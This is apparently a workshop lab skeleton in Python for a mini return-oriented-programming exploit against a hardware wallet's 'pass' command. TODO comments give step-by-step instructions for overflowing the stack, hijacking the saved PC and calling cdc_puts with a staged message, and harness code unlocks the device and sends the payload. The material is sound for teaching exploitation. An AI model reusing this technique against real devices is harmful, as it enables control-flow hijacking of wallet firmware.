#!/usr/bin/env python3
from __future__ import annotations

import argparse
import time
from dataclasses import dataclass

from helpers import (
    PortDiscoveryError,
    PayloadComposer,
    add_wallet_cli_args,
    create_wallet_client,
    format_bytes_as_u32_le_words,
    format_duration_hhmmss,
    is_unlocked,
    log,
    normalize_pin_digits,
    pin_digits_to_hex,
    resolve_wallet_port,
)

DEFAULT_MESSAGE = "This wallet has been pwned. I can print whatever I want."
DEFAULT_TIMEOUT_S = 2.0


@dataclass(frozen=True)
class MemoryLayout:
    cdc_puts_addr: int
    g_passphrase_addr: int
    pop_gadget_addr: int
    saved_r4_offset: int
    saved_pc_offset: int


# TODO(workshop, ~10 min):
# Fill in pinned Lab4 constants from provided disassembly snippets:
# - cdc_puts function address
# - g_passphrase address in RAM
# - pop {r0,r1,r2,pc} gadget address
# - offset to saved r4 in cmd_pass local frame
# - offset to saved pc in cmd_pass local frame
#
# MEMORY_LAYOUT = MemoryLayout(
#     cdc_puts_addr=...,
#     g_passphrase_addr=...,
#     pop_gadget_addr=...,
#     saved_r4_offset=...,
#     saved_pc_offset=...,
# )
#
# Use `lab4_validator.py` to validate your constants against the disassembly.
#

raise NotImplementedError("TODO: Create MEMORY_LAYOUT and fill in the constants")


def build_rop_payload(
    *,
    message: str,
    layout: MemoryLayout,
) -> bytes:
    if layout.saved_r4_offset < 8:
        raise ValueError("saved_r4_offset is unexpectedly small")
    if layout.saved_pc_offset < layout.saved_r4_offset + 16:
        raise ValueError("saved_pc_offset must be at least saved_r4_offset + 16")

    message_bytes = message.encode("utf-8")
    if len(message_bytes) + 1 > layout.saved_r4_offset:
        raise ValueError(
            f"message is too long: need <= {layout.saved_r4_offset - 1} bytes before saved r4"
        )

    payload = PayloadComposer()

    # TODO(workshop, ~10-15 min):
    # Build the payload in the same order stack words will be consumed.
    #
    # Step 1: Stage printable content.
    # - Write message bytes first (these are copied into g_passphrase).
    # - Append one NUL byte so cdc_puts can stop on string terminator.
    # - Pad with filler up to `layout.saved_r4_offset`.
    #
    # Step 2: Overwrite cmd_pass saved registers.
    # - Write 4 words for saved r4/r5/r6/r7 (filler values are fine).
    # - Pad further if needed until `layout.saved_pc_offset`.
    #
    # Step 3: Redirect execution to first gadget.
    # - Overwrite saved PC with `layout.pop_gadget_addr`.
    # - Use `thumb=True` for code addresses (set LSB to 1).
    #
    # Step 4: Provide words consumed by `pop {r0, r1, r2, pc}`.
    # - r0 = 0x0 (CDC0 interface id)
    # - r1 = layout.g_passphrase_addr (pointer to staged message)
    # - r2 = 0x1 (kept for stack slot alignment/argument position)
    # - pc = layout.cdc_puts_addr with Thumb bit set
    #
    # Step 5: Return the final payload as `bytes`.

    raise NotImplementedError("TODO: implement build_rop_payload function")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Lab4 bonus mini-ROP: print attacker-controlled g_passphrase via cdc_puts."
    )
    add_wallet_cli_args(parser)

    parser.add_argument(
        "--pin",
        required=True,
        help="PIN as decimal digits.",
    )
    parser.add_argument(
        "--message",
        default=DEFAULT_MESSAGE,
        help=f"Message prefix stored in g_passphrase (default: {DEFAULT_MESSAGE!r}).",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    started = time.perf_counter()
    flush_tail = "\r\n        "
    message = args.message
    # Add CRLF around message and trailing spaces for more reliable CDC flushing.
    if not message.startswith("\r\n"):
        message = f"\r\n{message}"
    if message.endswith(flush_tail):
        pass
    elif message.endswith("\r\n"):
        message = f"{message}{' ' * 8}"
    else:
        message = f"{message}{flush_tail}"

    try:
        payload = build_rop_payload(
            message=message,
            layout=MEMORY_LAYOUT,
        )
        payload_hex = payload.hex()
        log(f"Built Lab4 payload ({len(payload)} bytes)")
        log(f"Payload (u32 LE words): {format_bytes_as_u32_le_words(payload)}")
        log(f"Message prefix bytes: {message.encode('utf-8').hex()}")
        log(f"pass arg hex length: {len(payload_hex)}")

        port = resolve_wallet_port(args)
        log(f"port={port}")

        with create_wallet_client(args, port=port) as wallet:
            if not is_unlocked(wallet):
                pin_digits = normalize_pin_digits(args.pin)
                pin_hex = pin_digits_to_hex(pin_digits)
                pin_response = wallet.request("pin", pin_hex, timeout=3.0)
                if not pin_response.ok:
                    raise RuntimeError("PIN unlock failed")

            try:
                time.sleep(1)  # Ensure previous CDC output is flushed before sending payload.
                response = wallet.request("pass", payload_hex, timeout=DEFAULT_TIMEOUT_S)
                log(f"'pass' response: {response}")
            except TimeoutError:
                log("No response to 'pass' (this can be expected after control-flow hijack).")

        elapsed = format_duration_hhmmss(time.perf_counter() - started)
        log("If exploit succeeded, check CDC0 for your injected message.")
        log(f"time={elapsed}")
        return 0

    except PortDiscoveryError as e:
        log(f"port discovery error: {e}")
        return 2
    except Exception as e:
        elapsed = format_duration_hhmmss(time.perf_counter() - started)
        log(f"lab failed: {e}")
        log(f"time={elapsed}")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
